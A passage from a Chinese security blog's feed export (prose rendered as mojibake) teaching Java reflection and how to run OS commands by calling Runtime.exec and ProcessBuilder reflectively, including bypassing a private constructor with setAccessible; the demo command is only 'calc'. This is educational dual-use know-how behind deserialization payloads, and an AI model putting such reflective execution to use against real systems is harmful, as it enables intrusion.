</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String  name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"parameterlessMethodï¼šhello"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print2</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"parameterMethod: hello"</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="åå°„æ–¹æ³•è·å–Studentsç±»ã€‚"><a href="#åå°„æ–¹æ³•è·å–Studentsç±»ã€‚" class="headerlink" title="åå°„æ–¹æ³•è·å–Studentsç±»ã€‚"></a>åå°„æ–¹æ³•è·å–Studentsç±»ã€‚</h3><blockquote><p>å®ä¾‹åŒ–æ‰€éœ€è¦çš„ç±»é›†åˆ  Class[] classes = new Class[]{Integer.class,String.class,Integer.class,Integer.class,String.class};<br>é€šè¿‡æ„é€ å™¨æ„é€ ç±»Constructor constructor = cls.getDeclaredConstructor(classes);<br>é€šè¿‡è°ƒç”¨æœ‰å‚æ„é€ å™¨å®ä¾‹åŒ–ç±»Object str = constructor.newInstance(18, â€œsamnyâ€, 32326663, 10021, â€œhello!!â€);</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å–å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">            Class cls = Class.forName(<span class="string">"samny.reflection.Students"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            // è·å–æ„é€ å™¨æ–¹æ³•</span></span><br><span class="line">            Class[] classes = <span class="keyword">new</span> Class[]&#123;Integer<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">                    <span class="title">Integer</span>.<span class="title">class</span>,<span class="title">Integer</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>&#125;</span>;</span><br><span class="line">            Constructor constructor = cls.getDeclaredConstructor(classes);</span><br><span class="line"></span><br><span class="line">            Object str = constructor.newInstance(<span class="number">18</span>, <span class="string">"samny"</span>, <span class="number">32326663</span>, <span class="number">10021</span>, <span class="string">"hello!!"</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">            <span class="comment">// æˆ–è€…ä¸‹é¢è¿™æ ·å­è¾“å‡º</span></span><br><span class="line"><span class="comment">//            System.out.println(constructor.newInstance(18, "samny", 32326663, 10021, "hello!!"));</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException |</span><br><span class="line">                IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§„å¼€å‘äººå‘˜å®ä¾‹åŒ–ç±»æ„é€ ç±»demo"><a href="#å¸¸è§„å¼€å‘äººå‘˜å®ä¾‹åŒ–ç±»æ„é€ ç±»demo" class="headerlink" title="å¸¸è§„å¼€å‘äººå‘˜å®ä¾‹åŒ–ç±»æ„é€ ç±»demo"></a>å¸¸è§„å¼€å‘äººå‘˜å®ä¾‹åŒ–ç±»æ„é€ ç±»demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Sts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Students students = <span class="keyword">new</span> Students();</span><br><span class="line">        students.setAge(<span class="number">18</span>);</span><br><span class="line">        students.setName(<span class="string">"samny"</span>);</span><br><span class="line">        students.setCardId(<span class="number">32336666</span>);</span><br><span class="line">        students.setId(<span class="number">1001</span>);</span><br><span class="line">        students.setAgs(<span class="string">"helloooo!!"</span>);</span><br><span class="line">        System.out.println(students.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸€ä¸‹æ•ˆæœæ˜¯æ²¡æœ‰ä»»ä½•çš„åŒºåˆ«ï¼Œä½†åå°„æ“ä½œåªéœ€è¦çŸ¥é“ç±»åå°±å¯ä»¥å®Œå…¨æ“ä½œç±»ç”šè‡³æ˜¯ç±»ä¸­çš„ç§æœ‰æ–¹æ³•ä¹‹åæ–‡ç« ä¼šè¯¦ç»†è¯´æ˜ï¼Œæœ¬æ–‡ä¸åšè¯´æ˜ã€‚<br><img src="https://img-blog.csdnimg.cn/20200428161706305.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h3 id="åå°„è°ƒç”¨ç±»ä¸­çš„æ— å‚å’Œæœ‰å‚æ–¹æ³•ã€‚"><a href="#åå°„è°ƒç”¨ç±»ä¸­çš„æ— å‚å’Œæœ‰å‚æ–¹æ³•ã€‚" class="headerlink" title="åå°„è°ƒç”¨ç±»ä¸­çš„æ— å‚å’Œæœ‰å‚æ–¹æ³•ã€‚"></a>åå°„è°ƒç”¨ç±»ä¸­çš„æ— å‚å’Œæœ‰å‚æ–¹æ³•ã€‚</h3><blockquote><p>ä¹‹å‰è¯´è¿‡çš„çŸ¥è¯†å°±ä¸åœ¨è¯´æ˜<br>å¼€å¤´å°±è¯´äº†ï¼Œinvokeæ˜¯æ‰§è¡Œè·å–ç±»å¾—åˆ°æ–¹æ³•çš„æ–¹æ³•<br>ä½†è°ƒç”¨æœ‰å‚æ–¹æ³•å’Œæ— å‚æ–¹æ³•æœ‰ç‚¹ç»†å¾®çš„å·®åˆ«<br><code>getMethod</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»æ–¹æ³•åç§°ï¼Œç¬¬äºŒä¸ªæ˜¯ç±»å¯¹è±¡ã€‚è¿™é‡Œå…ˆç•™ä¸ªç–‘é—®ï¼Œå¦‚æœæ˜¯å¤šä¸ªç±»å¯¹è±¡å‘¢ï¼Ÿ<br><code>invoke</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>å®ä¾‹åŒ–</code>çš„ç±»å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯å‚æ•°å€¼<br>å¸¸è§„æ–¹æ³•çš„è°ƒç”¨ï¼Œç›´æ¥<code>Class.method()</code>å³å¯</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class  cls = Class.forName(<span class="string">"samny.reflection.classdemo1"</span>);</span><br><span class="line">            <span class="comment">// æ— å‚æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">            Object ob = cls.newInstance();</span><br><span class="line"><span class="comment">//            Method mt = cls.getMethod("print"); æœ‰æ²¡æœ‰nullå‡å¯</span></span><br><span class="line">            Method mt = cls.getMethod(<span class="string">"print"</span>,<span class="keyword">null</span>);</span><br><span class="line">            mt.invoke(ob,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// æœ‰å‚æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">            Method mt2 = cls.getMethod(<span class="string">"print2"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mt2.invoke(ob,<span class="string">"world"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200428162508475.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>Pç¥-Javaå®‰å…¨æ¼«è°ˆ-åå°„ç¯‡</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¦–å‘ï¼š&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaåå°„" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>ä»å®‰å…¨è§’åº¦è°ˆJavaåå°„æœºåˆ¶--å‰ç« </title>
    <link href="https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/</id>
    <published>2020-05-12T04:42:16.000Z</published>
    <updated>2020-05-13T02:29:56.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¦–å‘ï¼š<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; æ¬¢è¿å›æ¥ï¼Œä¸Šå›è¯´åˆ°Javaåå°„æœºåˆ¶åŸºç¡€çŸ¥è¯†ï¼Œå¹¶ç”¨ç®€å•ä»£ç åšäº†ä¸€ä¸ªç®€å•çš„Demoã€‚<br>&emsp;&emsp;ç¬”è€…ä»æ‰§è¡Œå‘½ä»¤çš„è§’åº¦æ¥å±•å¼€è¯é¢˜ï¼Œçœ‹è¿™ç¯‡æ–‡ç« å¤§éƒ¨åˆ†éƒ½æ˜¯ç½‘ç»œå®‰å…¨çš„ä»ä¸šè€…äº¦æˆ–è€…æ˜¯å®‰å…¨è§„èŒƒçš„å­¦ä¹ è€…ï¼Œä¼—æ‰€å‘¨çŸ¥æ‰§è¡Œå‘½ä»¤è·å–æƒé™æ˜¯å®‰å…¨äººå‘˜è¿½æ±‚ï¼Œä¹Ÿæ˜¯é»‘å®¢æœ€ç»ˆè¿½æ±‚ã€‚æ‰€ä»¥ä»æ‰§è¡Œå‘½ä»¤çš„è§’åº¦æ¥å±•å¼€ï¼Œæ— ç–‘æ˜¯æ¿€å‘ä½ ä»¬è¯»è€…æœ€å¤§é˜…è¯»å…´è¶£ã€‚</p><p> ps: æœ¬æ–‡å®éªŒä»£ç éƒ½ä¸Šä¼ <a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>é¡¹ç›®ï¼Œä¸ºäº†è®©æ›´å¤šäººçŸ¥é“ï¼Œéº»çƒ¦åŠ¨åŠ¨å°æ‰‹starä¸€ä¸‹ã€‚</p><hr><h1 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h1><p>&emsp;&emsp; è¿™é‡Œç¨å¾®è¡¥å……ä¸€ç‚¹å°çŸ¥è¯†ï¼Œå¯¹äºä¸€äº›0åŸºç¡€çš„è¯»è€…çš„ä¸€äº›çŸ¥è¯†è¡¥å……ï¼Œè€å¸æœºå¯ä»¥å¿½è§†ã€‚Javaæ‰§è¡Œå‘½ä»¤å¸¸è§çš„æœ‰ä¸¤ä¸ªç±»<code>java.lang.Runtime</code>å’Œ<code>java.lang.ProcessBuilder</code>ï¼Œé€šå¸¸æƒ…å†µä¸‹ä½¿ç”¨<code>java.lang.Runtime</code>ç±»ï¼Œä¸ªäººè§‰å¾—Runtimeç±»æ˜¯æ¯”ProcessBuilderå¥½ä½¿ç”¨äº›ã€‚</p><h2 id="windowsä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼"><a href="#windowsä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼" class="headerlink" title="windowsä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼"></a>windowsä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼</h2><ol><li>Windowsä¸‹è°ƒç”¨ç¨‹åº <blockquote><p>Process proc =Runtime.getRuntime().exec(â€œexefileâ€);</p><ol start="2"><li>Windowsä¸‹è°ƒç”¨ç³»ç»Ÿå‘½ä»¤<br>String [] cmd={â€œcmdâ€,â€/Câ€,â€copy exe1 exe2â€};<br>Process proc =Runtime.getRuntime().exec(cmd);</li><li>Windowsä¸‹è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¹¶å¼¹å‡ºå‘½ä»¤è¡Œçª—å£<br>String [] cmd={â€œcmdâ€,â€/Câ€,â€start copy exe1 exe2â€};<br>Process proc =Runtime.getRuntime().exec(cmd);</li></ol></blockquote><h2 id="Linuxä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼"><a href="#Linuxä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼" class="headerlink" title="Linuxä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼"></a>Linuxä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼</h2><ol><li>Linuxä¸‹è°ƒç”¨ç¨‹åº<blockquote><p>Process proc =Runtime.getRuntime().exec(â€œ./exefileâ€);</p></blockquote></li><li>Linuxä¸‹è°ƒç”¨ç³»ç»Ÿå‘½ä»¤<blockquote><p>String [] cmd={â€œ/bin/shâ€,â€-câ€,â€ln -s exe1 exe2â€};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li><li>Linuxä¸‹è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¹¶å¼¹å‡ºå‘½ä»¤è¡Œçª—å£<blockquote><p>String [] cmd={â€œ/bin/shâ€,â€-câ€,â€xterm -e ln -s exe1 exe2â€};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li></ol></li></ol><hr><h1 id="åå°„ä¹‹Runtime"><a href="#åå°„ä¹‹Runtime" class="headerlink" title="åå°„ä¹‹Runtime"></a>åå°„ä¹‹Runtime</h1><p><img src="https://img-blog.csdnimg.cn/20200428212414156.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><blockquote><p>Object ob = cls.getMethod(â€œgetRuntimeâ€,null).invoke(null,null);<br>è¿”å›çš„æ˜¯ä¸€ä¸ªRuntimeç±»å¯¹è±¡<br>å‰æ–‡è¯´è¿‡ï¼Œinvokeç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª<code>Objectç±»å¯¹è±¡</code><br>ä½ å¯èƒ½å¥½å¥‡ä¸ºä»€ä¹ˆæˆ‘ä¸ç›´æ¥ä½¿ç”¨<code>newInstance()</code>å‘¢ï¼Ÿ<br>å› ä¸ºRuntimeç±»ä¸­çš„æ— å‚æ„é€ æ–¹æ³•æ˜¯privateæƒé™ï¼Œæ— æ³•è®¿é—®ã€‚psï¼šå…¶å®æ˜¯æœ‰åŠæ³•çš„ï¼Œä¸‹æ–‡ä¼šè¯´é“ã€‚<br><code>getRuntime</code>æ–¹æ³•è¿”å›çš„æ˜¯Runtimeç±»å¯¹è±¡ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰äº›payloadä¼šä½¿ç”¨æ­¤æ–¹æ³•äº†ï¼Œè€Œä¸æ˜¯ç›´æ¥newInstanc()</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200428204852586.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–å¯¹è±¡</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">            <span class="comment">//å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">            Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// åå°„è°ƒç”¨æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">            cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><blockquote><p>å‰æ–‡è¯´è¿‡java.lang.Runtimeç±»æ— å‚æ„é€ æ–¹æ³•æ˜¯privateæƒé™æ— æ³•ç›´æ¥è°ƒç”¨<br>setAccessibleé€šè¿‡åå°„ä¿®æ”¹æ–¹æ³•çš„è®¿é—®æƒé™ï¼Œå¼ºåˆ¶å¯ä»¥è®¿é—®<br> Constructor constructor = cls.getDeclaredConstructor();æ˜¯è·å–ç±»æ„é€ å™¨æ–¹æ³•çš„æ–¹æ³•</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// è·å–å¯¹è±¡</span></span><br><span class="line">           Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">// è·å–æ„é€ æ–¹æ³•</span></span><br><span class="line">           Constructor constructor = cls.getDeclaredConstructor();</span><br><span class="line">           </span><br><span class="line">           constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           <span class="comment">// å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">           Object ob = constructor.newInstance();</span><br><span class="line">           Method mt = cls.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">           mt.invoke(ob,<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="åå°„ä¹‹ProcessBuilder"><a href="#åå°„ä¹‹ProcessBuilder" class="headerlink" title="åå°„ä¹‹ProcessBuilder"></a>åå°„ä¹‹ProcessBuilder</h1><p><img src="https://img-blog.csdnimg.cn/20200428212703809.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é€šè¿‡çœ‹JDKæ–‡æ¡£ï¼ŒProcessBuilderç±»æœ‰ä¸¤ä¸ªæ„é€ æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200428204717485.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æœåˆ†åˆ«ä½¿ç”¨åå°„æ„é€ æ–¹æ³•è·å–å®ä¾‹åŒ–è¯­å¥å¦‚ä¸‹ï¼š</p><ul><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)))</code></li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(String.class).newInstance(&quot;calc&quot;))</code></li></ul><h2 id="æ–¹æ³•ä¸€-1"><a href="#æ–¹æ³•ä¸€-1" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>&emsp;&emsp; æ–¹æ³•ä¸€ç¬”è€…åœ¨æ­¤å°±æä¸€ç‚¹ï¼Œ<code>newInstance()</code>å®ä¾‹åŒ–æ—¶æŠŠæ‰€éœ€è¦æ‰§è¡Œå‘½ä»¤å‚æ•°ç›´æ¥ä¸€å¹¶è¿›è¡Œäº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è·å–å¯¹è±¡</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">            Object ob = cls.getDeclaredConstructor(List<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">            ).newInstance(Arrays.asList("calc"));</span><br><span class="line">            <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="æ–¹æ³•äºŒ-1"><a href="#æ–¹æ³•äºŒ-1" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>&emsp;&emsp; æ–¹æ³•äºŒä½¿ç”¨ç¬¬äºŒç§æ„é€ æ–¹æ³•ï¼Œå¯å˜é•¿å‚æ•°(<code>String...</code>è¡¨ç¤ºå‚æ•°é•¿åº¦ä¸ç¡®å®š)ã€‚é‚£ä¹ˆå¯¹äºåå°„æ¥è¯´ï¼Œå¦‚æœè¦è·å–ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«çš„å¯å˜é•¿å‚æ•°ï¼Œå¯ç›´æ¥è§†ä¸ºæ•°ç»„ã€‚å› æ­¤åªéœ€è¦å°†<code>String [].class</code>ä¼ ç»™æ„é€ æ–¹æ³•å³å¯ï¼Œä½†åœ¨è°ƒç”¨<code>newInstance()</code>å®ä¾‹åŒ–æ–¹æ³•æ—¶ï¼Œä¸èƒ½ç›´æ¥ä¼ ä¸€ä¸ªä¸€ç»´æ•°ç»„<code>String[]{â€œcalc&quot;}</code>ï¼Œè€Œæ˜¯åº”è¯¥ä¼ å…¥ä¸€ä¸ªäºŒç»´æ•°ç»„<code>String[][]calc</code>ã€‚å› ä¸º<code>newInstance()</code>å‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæˆ‘ä»¬ä¼ ç»™<code>ProcessBuilder</code>çš„ä¹Ÿæ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ŒäºŒè€…å åŠ ç”±ä¸€ç»´æ•°ç»„å˜æˆäº†äºŒç»´æ•°ç»„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è·å–å¯¹è±¡</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 